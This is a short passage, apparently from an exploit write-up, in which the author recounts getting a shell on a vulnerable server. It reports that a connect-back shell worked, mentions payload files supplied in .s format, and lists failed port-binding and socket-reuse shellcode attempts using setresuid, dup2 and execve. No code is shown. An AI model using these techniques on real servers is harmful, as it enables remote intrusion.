88th bytes... Very weird. Nevertheless we can see `/bin/bash` launch in the server side
even if we don't have a bash on client side and we are also able to display a shell
thru a payload on server side. So I let you all those payloads in format *.s.
Finally we tried a ultimate solution : Connect Back Shell, and this one works... so
enjoy :-D.

**Note**: I tried lots of different ways to make the shell appears on client side...
when I try to use the Port Binding technique or the Socket Descriptor Reuse Shellcode.
I use setresuid(0,0,0), dup, dup2, read, fflush, use option in execve, execl and so on.
But nothing wanted to work. So if you know how to fix the problem so that the port
binding shellcode and the socket descriptor reuse shellcode work, let me know :-D.